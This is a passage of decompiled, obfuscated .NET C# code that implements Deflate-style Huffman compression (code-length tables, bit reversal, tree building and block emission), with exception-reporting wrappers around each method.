                    num12 = num13;
                  else
                    break;
                }
                num2 = num13;
                this.\u0001 += (long) num1;
                num3 -= num1;
                num9 = num3;
                if (true)
                {
                  if (num9 == 0 || this.\u0001 == 30)
                    goto label_24;
                }
                else
                  goto label_15;
              }
              while (this.\u0001.\u0002((this.\u0001 & 4) != 0, (this.\u0001 & 8) != 0));
              if (this.\u0001 != 16)
              {
                num10 = this.\u0001;
                num11 = 20;
                if (num11 != 0)
                {
                  if (num11 != 0)
                  {
                    if (num10 != num11)
                    {
                      int num14 = this.\u0001;
                      num11 = 28;
                      num10 = num14;
                    }
                    else
                      goto label_12;
                  }
                }
                else
                  goto label_14;
              }
              else
                goto label_8;
            }
            while (num10 != num11);
            goto label_23;
label_12:
            if (true)
            {
              num11 = -this.\u0001.\u0001() & 7;
              num10 = 8;
            }
            else
              goto label_19;
label_14:
            num9 = num10 + num11;
label_15:
            num5 = num9;
label_19:
            int num15;
            for (; num5 > 0; num5 = num15)
            {
              this.\u0001.\u0001(2, 10);
              num15 = num5 - 10;
              if (true)
              {
                if (true)
                  continue;
                num6 = num15;
                goto label_25;
              }
              else
              {
                num7 = num15;
                goto label_26;
              }
            }
            this.\u0001 = 16;
            continue;
label_23:
            this.\u0001.\u0001();
            this.\u0001 = 30;
          }
label_8:
          return num4 - num3;
label_24:
          return num4 - num3;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local5 = (ValueType) num5;
          byte[] numArray = obj0;
          \u0003.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) this, (object) numArray);
          throw;
        }
      }
    }

    internal sealed class \u0007
    {
      private static readonly int[] \u0001;
      private static readonly byte[] \u0001;
      private \u0003.\u000E \u0001;
      private \u0003.\u0007.\u0001 \u0001;
      private \u0003.\u0007.\u0001 \u0002;
      private \u0003.\u0007.\u0001 \u0003;
      private short[] \u0001;
      private byte[] \u0002;
      private int \u0001;
      private int \u0002;
      private static readonly short[] \u0002;
      private static readonly byte[] \u0003;
      private static readonly short[] \u0003;
      private static readonly byte[] \u0004;

      public static short \u0001([In] int obj0)
      {
        short num1;
        try
        {
          int num2 = (int) \u0003.\u0007.\u0001[obj0 & 15];
          if (true)
            num2 <<= 12;
          int num3;
          if (true)
          {
            int num4 = (int) \u0003.\u0007.\u0001[obj0 >> 4 & 15];
            int num5;
            while (true)
            {
              num5 = num4 << 8;
              if (false)
                num4 = num5;
              else
                break;
            }
            num3 = num2 | num5;
          }
          else
            goto label_7;
label_6:
          int num6 = (int) \u0003.\u0007.\u0001[obj0 >> 8 & 15] << 4;
          num2 = num3 | num6 | (int) \u0003.\u0007.\u0001[obj0 >> 12];
label_7:
          num3 = (int) (short) num2;
          if (true)
            num1 = (short) num3;
          else
            goto label_6;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) obj0;
          \u0003.\u0001(ex, (object) local);
          throw;
        }
        return num1;
      }

      static \u0007()
      {
        int index;
        try
        {
          \u0003.\u0007.\u0001 = new int[19]
          {
            16,
            17,
            18,
            0,
            8,
            7,
            9,
            6,
            10,
            5,
            11,
            4,
            12,
            3,
            13,
            2,
            14,
            1,
            15
          };
          \u0003.\u0007.\u0001 = new byte[16]
          {
            (byte) 0,
            (byte) 8,
            (byte) 4,
            (byte) 12,
            (byte) 2,
            (byte) 10,
            (byte) 6,
            (byte) 14,
            (byte) 1,
            (byte) 9,
            (byte) 5,
            (byte) 13,
            (byte) 3,
            (byte) 11,
            (byte) 7,
            (byte) 15
          };
          int length = 286;
          while (true)
          {
            \u0003.\u0007.\u0002 = new short[length];
            \u0003.\u0007.\u0003 = new byte[286];
            int num1;
            do
            {
              index = 0;
              int num2;
              while (true)
              {
                num1 = index;
                if (true)
                {
                  num2 = 144;
                  if (num2 != 0)
                  {
                    if (num1 < num2)
                    {
                      \u0003.\u0007.\u0002[index] = \u0003.\u0007.\u0001(48 + index << 8);
                      if (true)
                        \u0003.\u0007.\u0003[index++] = (byte) 8;
                      else
                        goto label_10;
                    }
                    else
                      break;
                  }
                  else
                    goto label_9;
                }
                else
                  goto label_23;
              }
label_8:
              int num3 = index;
              num2 = 256;
              num1 = num3;
label_9:
              if (num1 < num2)
              {
                \u0003.\u0007.\u0002[index] = \u0003.\u0007.\u0001(256 + index << 7);
                \u0003.\u0007.\u0003[index++] = (byte) 9;
                goto label_8;
              }
label_10:;
            }
            while (false);
            break;
label_23:
            length = num1;
          }
          for (; index < 280; \u0003.\u0007.\u0003[index++] = (byte) 7)
          {
            \u0003.\u0007.\u0002[index] = \u0003.\u0007.\u0001(index - 256 << 9);
            if (false)
              goto label_19;
          }
label_15:
          for (; index < 286; \u0003.\u0007.\u0003[index++] = (byte) 8)
            \u0003.\u0007.\u0002[index] = \u0003.\u0007.\u0001(index - 88 << 8);
          \u0003.\u0007.\u0003 = new short[30];
          \u0003.\u0007.\u0004 = new byte[30];
          index = 0;
label_19:
          for (; index < 30; ++index)
          {
            \u0003.\u0007.\u0003[index] = \u0003.\u0007.\u0001(index << 11);
            if (true)
              \u0003.\u0007.\u0004[index] = (byte) 5;
            else
              goto label_15;
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) index;
          \u0003.\u0001(ex, (object) local);
          throw;
        }
      }

      public \u0007([In] \u0003.\u000E obj0)
      {
        try
        {
          this.\u0001 = obj0;
          this.\u0001 = new \u0003.\u0007.\u0001(this, 286, 257, 15);
          this.\u0002 = new \u0003.\u0007.\u0001(this, 30, 1, 15);
          this.\u0003 = new \u0003.\u0007.\u0001(this, 19, 4, 7);
          this.\u0001 = new short[16384];
          this.\u0002 = new byte[16384];
        }
        catch (Exception ex)
        {
          \u0003.\u000E obj = obj0;
          \u0003.\u0001(ex, (object) this, (object) obj);
          throw;
        }
      }

      public void \u0001()
      {
        try
        {
          do
          {
            if (true)
              goto label_2;
label_1:
            continue;
label_2:
            this.\u0001 = 0;
            goto label_1;
          }
          while (false);
          this.\u0002 = 0;
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
      }

      private int \u0001([In] int obj0)
      {
        int num1;
        int num2;
        try
        {
          do
          {
            if (true)
              goto label_9;
label_2:
            continue;
label_9:
            if (obj0 == (int) byte.MaxValue)
            {
              num1 = 285;
              goto label_2;
            }
            else
              goto label_3;
          }
          while (false);
          goto label_16;
label_3:
          int num3;
          if (true)
          {
            int num4 = 257;
            int num5;
            while (true)
            {
              num2 = num4;
              int num6;
              while (true)
              {
                num6 = obj0;
                if (true)
                {
                  if (num6 >= 8)
                  {
                    num2 += 4;
                    num5 = obj0 >> 1;
                    if (true)
                      obj0 = num5;
                    else
                      goto label_5;
                  }
                  else
                    goto label_14;
                }
                else
                  break;
              }
              num4 = num6;
            }
label_5:
            num3 = num5;
          }
          else
            goto label_14;
label_8:
          int num7 = obj0;
          num1 = num3 + num7;
          goto label_16;
label_14:
          num3 = num2;
          goto label_8;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj0;
          \u0003.\u0001(ex, (object) local1, (object) this, (object) local2);
          throw;
        }
label_16:
        return num1;
      }

      private int \u0002([In] int obj0)
      {
        int num1;
        try
        {
          int num2;
          if (true)
          {
            int num3 = 0;
            if (num3 != 0)
            {
              num2 = num3;
              goto label_6;
            }
            else
            {
              num1 = num3;
              goto label_13;
            }
          }
          else
            goto label_12;
label_2:
          int num4;
          int num5;
          num1 = num4 + num5;
          goto label_12;
label_6:
          num5 = 4;
          num4 = num2;
label_7:
          int num6;
          for (; num4 < num5; num4 = num6)
          {
            num6 = num1;
            int num7 = obj0;
            if (true)
              return num6 + num7;
            num5 = num7;
          }
          int num8 = num1;
          num5 = 2;
          num4 = num8;
          goto label_2;
label_12:
          num4 = obj0;
          num5 = 1;
          if (num5 != 0)
          {
            if (num5 != 0)
              obj0 = num4 >> num5;
            else
              goto label_7;
          }
          else
            goto label_2;
label_13:
          num2 = obj0;
          goto label_6;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj0;
          \u0003.\u0001(ex, (object) local1, (object) this, (object) local2);
          throw;
        }
      }

      public void \u0001([In] int obj0)
      {
label_0:
        int index;
        try
        {
          this.\u0003.\u0001();
          this.\u0001.\u0001();
          this.\u0002.\u0001();
          if (true)
            goto label_10;
label_2:
          if (false)
            return;
          this.\u0001.\u0001((int) this.\u0003.\u0001[\u0003.\u0007.\u0001[index]], 3);
          int num1;
          int num2;
          if (true)
          {
            num1 = index;
            num2 = 1;
            if (num2 != 0)
              index = num1 + num2;
            else
              goto label_7;
          }
          else
            goto label_0;
label_6:
          int num3 = index;
          num2 = obj0;
          num1 = num3;
label_7:
          if (num1 >= num2)
          {
            this.\u0001.\u0002(this.\u0003);
            this.\u0002.\u0002(this.\u0003);
            return;
          }
          goto label_2;
label_10:
          \u0003.\u000E obj = this.\u0001;
          int num4 = this.\u0001.\u0002 - 257;
          if (true)
            goto label_11;
label_1:
          do
          {
            this.\u0001.\u0001(this.\u0002.\u0002 - 1, 5);
            this.\u0001.\u0001(obj0 - 4, 4);
            index = 0;
          }
          while (false);
          goto label_6;
label_11:
          obj.\u0001(num4, 5);
          goto label_1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) index;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj0;
          \u0003.\u0001(ex, (object) local1, (object) this, (object) local2);
          throw;
        }
      }

      public void \u0002()
      {
        int num1;
        int num2;
        int num3;
        int num4;
        int num5;
        int index1;
        try
        {
          if (true)
          {
            index1 = 0;
            goto label_16;
          }
label_7:
          num5 = this.\u0002(num1);
label_8:
          this.\u0002.\u0001(num5);
          int num6 = num5;
          int num7 = 2;
label_9:
          int num8 = num6 / num7 - 1;
          if (true)
          {
            num4 = num8;
            num8 = num4;
          }
          if (num8 > 0)
            this.\u0001.\u0001(num1 & (1 << num4) - 1, num4);
label_14:
          int num9 = index1;
          int num10 = 1;
          if (num10 == 0)
          {
            num7 = num10;
            num6 = num9;
            goto label_9;
          }
          else
            index1 = num9 + num10;
label_16:
          int num11 = index1;
          if (true)
          {
            int num12 = this.\u0001;
            if (num11 >= num12)
            {
              this.\u0001.\u0001(256);
              if (true)
                return;
              goto label_8;
            }
            else
              num11 = (int) this.\u0002[index1] & (int) byte.MaxValue;
          }
          num2 = num11;
          num1 = (int) this.\u0001[index1];
          int num13;
          for (int index2 = num1--; index2 != 0; index2 = num13)
          {
            num3 = this.\u0001(num2);
            this.\u0001.\u0001(num3);
            if (true)
            {
              num13 = num3;
              if (true)
              {
                num4 = (num13 - 261) / 4;
                if (num4 > 0 && num4 <= 5)
                {
                  this.\u0001.\u0001(num2 & (1 << num4) - 1, num4);
                  goto label_7;
                }
                else
                  goto label_7;
              }
            }
            else
              goto label_14;
          }
          this.\u0001.\u0001(num2);
          goto label_14;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) index1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> local5 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> local6 = (ValueType) num5;
          \u0003.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) this);
          throw;
        }
      }

      public void \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2, [In] bool obj3)
      {
        try
        {
          if (true)
            this.\u0001.\u0001(obj3 ? 1 : 0, 3);
          this.\u0001.\u0001();
          if (true)
            goto label_5;
label_1:
          if (true)
          {
            this.\u0001();
            return;
          }
          goto label_6;
label_5:
          this.\u0001.\u0001(obj2);
label_6:
          this.\u0001.\u0001(~obj2);
          this.\u0001.\u0001(obj0, obj1, obj2);
          goto label_1;
        }
        catch (Exception ex)
        {
          byte[] numArray = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj2;
          // ISSUE: variable of a boxed type
          __Boxed<bool> local3 = (ValueType) obj3;
          \u0003.\u0001(ex, (object) this, (object) numArray, (object) local1, (object) local2, (object) local3);
          throw;
        }
      }

      public void \u0002([In] byte[] obj0, [In] int obj1, [In] int obj2, [In] bool obj3)
      {
        int num1;
        int index1;
        int num2;
        int num3;
        int index2;
        int index3;
        short[] numArray;
        try
        {
          (numArray = this.\u0001.\u0001)[256] = (short) ((int) numArray[256] + 1);
          this.\u0001.\u0002();
          this.\u0002.\u0002();
          this.\u0001.\u0001(this.\u0003);
          this.\u0002.\u0001(this.\u0003);
          this.\u0003.\u0002();
          num1 = 4;
          for (index1 = 18; index1 > num1; --index1)
          {
            if (this.\u0003.\u0001[\u0003.\u0007.\u0001[index1]] > (byte) 0)
              num1 = index1 + 1;
          }
          num2 = 14 + num1 * 3 + this.\u0003.\u0001() + this.\u0001.\u0001() + this.\u0002.\u0001() + this.\u0002;
          num3 = this.\u0002;
          for (index2 = 0; index2 < 286; ++index2)
            num3 += (int) this.\u0001.\u0001[index2] * (int) \u0003.\u0007.\u0003[index2];
          for (index3 = 0; index3 < 30; ++index3)
            num3 += (int) this.\u0002.\u0001[index3] * (int) \u0003.\u0007.\u0004[index3];
          if (num2 >= num3)
            num2 = num3;
          if (obj1 >= 0 && obj2 + 4 < num2 >> 3)
            this.\u0001(obj0, obj1, obj2, obj3);
          else if (num2 == num3)
          {
            this.\u0001.\u0001(2 + (obj3 ? 1 : 0), 3);
            this.\u0001.\u0001(\u0003.\u0007.\u0002, \u0003.\u0007.\u0003);
            this.\u0002.\u0001(\u0003.\u0007.\u0003, \u0003.\u0007.\u0004);
            this.\u0002();
            this.\u0001();
          }
          else
          {
            this.\u0001.\u0001(4 + (obj3 ? 1 : 0), 3);
            this.\u0001(num1);
            this.\u0002();
            this.\u0001();
          }
        }
        catch (Exception ex)
        {
          object[] objArray = new object[12]
          {
            (object) num1,
            (object) index1,
            (object) num2,
            (object) num3,
            (object) index2,
            (object) index3,
            (object) numArray,
            (object) this,
            (object) obj0,
            (object) obj1,
            (object) obj2,
            (object) obj3
          };
          \u0003.\u0001(ex, objArray);
          throw;
        }
      }

      public bool \u0001()
      {
        bool flag;
        try
        {
          do
          {
            do
            {
              if (true)
                goto label_5;
label_3:
              continue;
label_5:
              int num1 = this.\u0001 < 16384 ? 1 : 0;
              int num2;
              while (true)
              {
                num2 = num1 == 0 ? 1 : 0;
                if (false)
                  num1 = num2;
                else
                  break;
              }
              flag = num2 != 0;
              goto label_3;
            }
            while (false);
          }
          while (false);
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
        return flag;
      }

      public bool \u0001([In] int obj0)
      {
        short[] numArray1;
        int num1;
        int index1;
        try
        {
          this.\u0001[this.\u0001] = (short) 0;
          byte[] numArray2 = this.\u0002;
          \u0003.\u0007 obj = this;
          int num2;
          num1 = num2 = obj.\u0001;
          obj.\u0001 = num2 + 1;
          int index2 = num1;
          int num3 = (int) (byte) obj0;
          numArray2[index2] = (byte) num3;
          (numArray1 = this.\u0001.\u0001)[index1 = obj0] = (short) ((int) numArray1[(IntPtr) index1] + 1);
          return this.\u0001();
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          short[] numArray3 = numArray1;
          // ISSUE: variable of a boxed type
          __Boxed<IntPtr> local2 = (ValueType) (IntPtr) index1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) obj0;
          \u0003.\u0001(ex, (object) local1, (object) numArray3, (object) local2, (object) this, (object) local3);
          throw;
        }
      }

      public bool \u0001([In] int obj0, [In] int obj1)
      {
        int num1;
        short[] numArray1;
        IntPtr index1;
        int num2;
        int num3;
        try
        {
          this.\u0001[this.\u0001] = (short) obj0;
          byte[] numArray2 = this.\u0002;
          \u0003.\u0007 obj = this;
          int num4;
          num3 = num4 = obj.\u0001;
          obj.\u0001 = num4 + 1;
          int index2 = num3;
          int num5 = (int) (byte) (obj1 - 3);
          numArray2[index2] = (byte) num5;
          num1 = this.\u0001(obj1 - 3);
          (numArray1 = this.\u0001.\u0001)[(int) (index1 = (IntPtr) num1)] = (short) ((int) numArray1[index1] + 1);
          if (num1 >= 265 && num1 < 285)
            this.\u0002 += (num1 - 261) / 4;
          num2 = this.\u0002(obj0 - 1);
          (numArray1 = this.\u0002.\u0001)[(int) (index1 = (IntPtr) num2)] = (short) ((int) numArray1[index1] + 1);
          if (num2 >= 4)
            this.\u0002 += num2 / 2 - 1;
          return this.\u0001();
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num3;
          short[] numArray3 = numArray1;
          // ISSUE: variable of a boxed type
          __Boxed<IntPtr> local4 = (ValueType) index1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local5 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local6 = (ValueType) obj1;
          \u0003.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) numArray3, (object) local4, (object) this, (object) local5, (object) local6);
          throw;
        }
      }

      public sealed class \u0001
      {
        public short[] \u0001;
        public byte[] \u0001;
        public int \u0001;
        public int \u0002;
        private short[] \u0002;
        private int[] \u0001;
        private int \u0003;
        private \u0003.\u0007 \u0001;

        public \u0001([In] \u0003.\u0007 obj0, [In] int obj1, [In] int obj2, [In] int obj3)
        {
          try
          {
            this.\u0001 = obj0;
            this.\u0001 = obj2;
            this.\u0003 = obj3;
            this.\u0001 = new short[obj1];
            this.\u0001 = new int[obj3];
          }
          catch (Exception ex)
          {
            \u0003.\u0007 obj = obj0;
            // ISSUE: variable of a boxed type
            __Boxed<int> local1 = (ValueType) obj1;
            // ISSUE: variable of a boxed type
            __Boxed<int> local2 = (ValueType) obj2;
            // ISSUE: variable of a boxed type
            __Boxed<int> local3 = (ValueType) obj3;
            \u0003.\u0001(ex, (object) this, (object) obj, (object) local1, (object) local2, (object) local3);
            throw;
          }
        }

        public void \u0001([In] int obj0)
        {
          try
          {
            do
            {
              if (true)
                goto label_3;
label_1:
              continue;
label_3:
              this.\u0001.\u0001.\u0001((int) this.\u0002[obj0] & (int) ushort.MaxValue, (int) this.\u0001[obj0]);
              goto label_1;
            }
            while (false);
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> local = (ValueType) obj0;
            \u0003.\u0001(ex, (object) this, (object) local);
            throw;
          }
        }

        public void \u0001([In] short[] obj0, [In] byte[] obj1)
        {
label_0:
          try
          {
            if (false)
              goto label_2;
            else
              goto label_4;
label_1:
            if (true)
              this.\u0001 = obj1;
            else
              goto label_0;
label_2:
            if (true)
              return;
            goto label_1;
label_4:
            this.\u0002 = obj0;
            goto label_1;
          }
          catch (Exception ex)
          {
            short[] numArray1 = obj0;
            byte[] numArray2 = obj1;
            \u0003.\u0001(ex, (object) this, (object) numArray1, (object) numArray2);
            throw;
          }
        }

        public void \u0001()
        {
          int num1;
          int index1;
          int index2;
          int num2;
          int[] numArray1;
          int[] numArray2;
          IntPtr index3;
          try
          {
            int length = this.\u0001.Length;
label_22:
            numArray1 = new int[this.\u0003];
            num1 = 0;
            this.\u0002 = new short[this.\u0001.Length];
            index1 = 0;
            while (true)
            {
              if (index1 >= this.\u0003)
              {
                index2 = 0;
                if (false)
                  goto label_22;
                else
                  goto label_19;
              }
              else
                goto label_23;
label_13:
              int num3;
              num2 = num3;
              int num4 = num2;
label_14:
              if (num4 > 0)
              {
                this.\u0002[index2] = \u0003.\u0007.\u0001(numArray1[num2 - 1]);
                (numArray2 = numArray1)[(int) (index3 = (IntPtr) (num2 - 1))] = numArray2[index3] + (1 << 16 - num2);
              }
              int num5 = index2;
              int num6;
              while (true)
              {
                num6 = num5 + 1;
                if (false)
                  num5 = num6;
                else
                  break;
              }
              index2 = num6;
label_19:
              int num7 = index2;
              int num8 = this.\u0002;
label_20:
              if (num7 >= num8)
                break;
              num3 = (int) this.\u0001[index2];
              goto label_13;
label_23:
              numArray1[index1] = num1;
              if (true)
              {
                num3 = num1;
                if (true)
                {
                  int num9 = this.\u0001[index1] << 15 - index1;
                  if (true)
                  {
                    int num10 = num3 + num9;
                    if (true)
                    {
                      num1 = num10;
                      ++index1;
                    }
                    else
                    {
                      num4 = num10;
                      goto label_14;
                    }
                  }
                  else
                  {
                    num8 = num9;
                    num7 = num3;
                    goto label_20;
                  }
                }
                else
                  goto label_13;
              }
              else
                goto label_22;
            }
          }
          catch (Exception ex)
          {
            int[] numArray3 = numArray1;
            // ISSUE: variable of a boxed type
            __Boxed<int> local1 = (ValueType) num1;
            // ISSUE: variable of a boxed type
            __Boxed<int> local2 = (ValueType) index1;
            // ISSUE: variable of a boxed type
            __Boxed<int> local3 = (ValueType) index2;
            // ISSUE: variable of a boxed type
            __Boxed<int> local4 = (ValueType) num2;
            int[] numArray4 = numArray2;
            // ISSUE: variable of a boxed type
            __Boxed<IntPtr> local5 = (ValueType) index3;
            \u0003.\u0001(ex, (object) numArray3, (object) local1, (object) local2, (object) local3, (object) local4, (object) numArray4, (object) local5, (object) this);
            throw;
          }
        }

        private void \u0001([In] int[] obj0)
        {
          int index1;
          int length;
          int[] numArray1;
          int index2;
          int num1;
          int num2;
          int num3;
          int num4;
          int[] numArray2;
          IntPtr index3;
          int num5;
          int num6;
          int num7;
          int num8;
          int num9;
          int index4;
          try
          {
            this.\u0001 = new byte[this.\u0001.Length];
            length = obj0.Length / 2;
            num6 = (length + 1) / 2;
            num2 = 0;
            index1 = 0;
            while (true)
            {
              if (index1 < this.\u0003)
                goto label_38;
              else
                goto label_4;
label_2:
              int num10;
              int num11;
              index1 = num10 + num11;
              continue;
label_4:
              if (true)
              {
                numArray1 = new int[length];
                numArray1[length - 1] = 0;
                index2 = length - 1;
                goto label_15;
              }
              else
                goto label_25;
label_7:
              int num12;
              int num13;
              if (num12 != -1)
              {
                num13 = numArray1[index2];
              }
              else
              {
                num4 = numArray1[index2];
                (numArray2 = this.\u0001)[(int) (index3 = (IntPtr) (num4 - 1))] = numArray2[index3] + 1;
                this.\u0001[obj0[2 * index2]] = (byte) numArray1[index2];
                goto label_14;
              }
label_9:
              num1 = num13 + 1;
              if (num1 > this.\u0003)
              {
                if (true)
                {
                  num1 = this.\u0003;
                  ++num2;
                }
                else
                  goto label_19;
              }
              int[] numArray3 = numArray1;
              int index5 = obj0[2 * index2];
              numArray1[obj0[2 * index2 + 1]] = num3 = num1;
              int num14 = num3;
              numArray3[index5] = num14;
label_14:
              --index2;
label_15:
              int num15 = index2;
              int num16 = 0;
              if (num16 != 0)
              {
                num11 = num16;
                num10 = num15;
                goto label_2;
              }
              else if (num15 >= num16)
              {
                num12 = obj0[2 * index2 + 1];
                goto label_7;
              }
              else if (num2 == 0)
                break;
label_19:
              num13 = this.\u0003;
              if (true)
              {
                num5 = num13 - 1;
                do
                {
                  do
                    ;
                  while (this.\u0001[--num5] == 0);
                  do
                  {
                    (numArray2 = this.\u0001)[(int) (index3 = (IntPtr) num5)] = numArray2[index3] - 1;
                    int[] numArray4;
                    numArray2 = numArray4 = this.\u0001;
                    int index6;
                    num5 = index6 = num5 + 1;
                    index3 = (IntPtr) index6;
                    int num17 = numArray2[index3] + 1;
                    numArray4[index6] = num17;
                    num2 -= 1 << this.\u0003 - 1 - num5;
                  }
                  while (num2 > 0 && num5 < this.\u0003 - 1);
                }
                while (num2 > 0);
              }
              else
                goto label_9;
label_24:
              (numArray2 = this.\u0001)[(int) (index3 = (IntPtr) (this.\u0003 - 1))] = numArray2[index3] + num2;
label_25:
              while (true)
              {
                (numArray2 = this.\u0001)[(int) (index3 = (IntPtr) (this.\u0003 - 2))] = numArray2[index3] - num2;
                num7 = 2 * num6;
                if (true)
                {
label_36:
                  int num18;
                  for (num8 = this.\u0003; num8 != 0; num8 = num18)
                  {
                    num12 = this.\u0001[num8 - 1];
                    if (true)
                    {
                      num9 = num12;
                      while (num9 > 0)
                      {
                        num18 = 2;
                        if (num18 != 0)
                        {
                          index4 = num18 * obj0[num7++];
                          if (obj0[index4 + 1] == -1)
                          {
                            this.\u0001[obj0[index4]] = (byte) num8;
                            --num9;
                          }
                        }
                        else
                          goto label_36;
                      }
                      num18 = num8 - 1;
                    }
                    else
                      goto label_7;
                  }
                  return;
                }
              }
              goto label_24;
label_38:
              this.\u0001[index1] = 0;
              num10 = index1;
              num11 = 1;
              goto label_2;
            }
          }
          catch (Exception ex)
          {
            object[] objArray = new object[18]
            {
              (object) length,
              (object) num6,
              (object) num2,
              (object) index1,
              (object) numArray1,
              (object) index2,
              (object) num1,
              (object) num4,
              (object) num5,
              (object) num7,
              (object) num8,
              (object) num9,
              (object) index4,
              (object) num3,
              (object) numArray2,
              (object) index3,
              (object) this,
              (object) obj0
            };
            \u0003.\u0001(ex, objArray);
            throw;
          }
        }

        public void \u0002()
        {
          int num1;
          int num2;
          int index1;
          int[] numArray1;
          int index2;
          int index3;
          int num3;
          int length1;
          int num4;
          int num5;
          int[] numArray2;
          int[] numArray3;
          int num6;
          int index4;
          int index5;
          int index6;
          int index7;
          int index8;
          int index9;
          int num7;
          int index10;
          int num8;
          try
          {
            length1 = this.\u0001.Length;
            int length2 = length1;
            if (true)
            {
              numArray1 = new int[length2];
              num2 = 0;
              num3 = 0;
              index3 = 0;
              goto label_9;
            }
            else
              goto label_6;
label_5:
            length2 = index1;
label_6:
            if (length2 > 0 && (int) this.\u0001[numArray1[index2 = (index1 - 1) / 2]] > num1)
            {
              numArray1[index1] = numArray1[index2];
              index1 = index2;
              goto label_5;
            }
            else
            {
              numArray1[index1] = index3;
              num3 = index3;
            }
label_8:
            ++index3;
label_9:
            if (index3 >= length1)
            {
              for (; num2 < 2; numArray1[num2++] = num4)
              {
                int num9;
                if (num3 >= 2)
                  num9 = 0;
                else
                  num3 = num9 = num3 + 1;
                num4 = num9;
              }
              this.\u0002 = Math.Max(num3 + 1, this.\u0001);
              num5 = num2;
              numArray2 = new int[4 * num2 - 2];
              int num10 = 2;
              int num11 = num2;
              while (true)
              {
                numArray3 = new int[num10 * num11 - 1];
                num6 = num5;
label_17:
                int num12 = 0;
label_18:
                index4 = num12;
                int num13;
                int num14;
                while (true)
                {
                  int num15;
                  if (index4 < num2)
                  {
                    index5 = numArray1[index4];
                    numArray2[2 * index4] = index5;
                    numArray2[2 * index4 + 1] = -1;
                    numArray3[index4] = (int) this.\u0001[index5] << 8;
                    numArray1[index4] = index4;
                    num13 = index4;
                    num14 = 1;
                    if (num14 != 0)
                      num15 = num13 + num14;
                    else
                      break;
                  }
                  else
                    goto label_23;
label_21:
                  index4 = num15;
                  continue;
label_23:
                  index6 = numArray1[0];
                  index7 = numArray1[--num2];
                  index8 = 0;
                  index9 = 1;
label_29:
                  int num16 = index9;
                  int num17;
                  for (int index11 = num2; num16 < index11; num16 = num17)
                  {
                    int num18 = index9;
                    if (false)
                    {
                      num15 = num18;
                      goto label_21;
                    }
                    else
                    {
                      num17 = num18 + 1;
                      int num19 = num2;
                      if (true)
                      {
                        if (num17 < num19 && numArray3[numArray1[index9]] > numArray3[numArray1[index9 + 1]])
                          ++index9;
                        numArray1[index8] = numArray1[index9];
                        index8 = index9;
                        index9 = index9 * 2 + 1;
                        goto label_29;
                      }
                      else
                        index11 = num19;
                    }
                  }
                  num7 = numArray3[index7];
                  while (true)
                  {
                    int num20;
                    int num21;
                    for (index9 = num20 = index8; num20 <= 0 || numArray3[numArray1[index8 = (index9 - 1) / 2]] <= num7; num20 = num21)
                    {
                      numArray1[index9] = index7;
                      index10 = numArray1[0];
                      index7 = num6++;
                      numArray2[2 * index7] = index6;
                      numArray2[2 * index7 + 1] = index10;
                      if (true)
                      {
                        num8 = Math.Min(numArray3[index6] & (int) byte.MaxValue, numArray3[index10] & (int) byte.MaxValue);
                        numArray3[index7] = num7 = numArray3[index6] + numArray3[index10] - num8 + 1;
                        index8 = 0;
                        for (index9 = 1; index9 < num2; index9 = index8 * 2 + 1)
                        {
                          if (index9 + 1 < num2 && numArray3[numArray1[index9]] > numArray3[numArray1[index9 + 1]])
                            ++index9;
                          numArray1[index8] = numArray1[index9];
                          index8 = index9;
                        }
                        while (true)
                        {
                          index9 = num21 = index8;
                          if (true)
                          {
                            if (num21 > 0 && numArray3[numArray1[index8 = (index9 - 1) / 2]] > num7)
                              numArray1[index9] = numArray1[index8];
                            else
                              break;
                          }
                          else
                            break;
                        }
                        numArray1[index9] = index7;
                        int num22 = num2;
                        if (false)
                        {
                          num12 = num22;
                          goto label_18;
                        }
                        else
                        {
                          if (num22 <= 1)
                          {
                            this.\u0001(numArray2);
                            return;
                          }
                          goto label_23;
                        }
                      }
                      else
                        goto label_17;
                    }
